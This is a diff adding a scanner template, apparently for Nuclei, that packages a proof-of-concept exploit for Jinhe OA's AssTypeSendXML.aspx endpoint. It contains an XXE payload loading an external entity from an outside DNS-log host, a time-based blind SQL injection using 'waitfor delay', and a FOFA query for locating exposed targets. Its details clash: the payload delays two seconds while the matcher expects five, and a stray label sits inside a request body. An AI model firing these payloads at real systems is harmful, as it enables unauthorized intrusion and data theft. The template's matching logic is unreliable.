@@ -1,0 +1,45 @@
+id: poc-cq378ct4vx6h0cid
+info:
+  name: 金和OA AssTypeSendXML.aspx 存在XXE+SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cq378ct4vx6h0cid
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,xxe,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cq378ct4vx6h0cid
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/Jhsoft.Web.Asset/AssTypeSendXML.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
+
+    %remote;]>
+
+    <root/>
+
+
+    SQL注入：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - "POST /c6/Jhsoft.Web.Asset/AssTypeSendXML.aspx/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<root>\n  <type>2</type>\n<assetTypeID>1001'waitfor delay'0:0:2'--</assetTypeID>\n</root>"
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
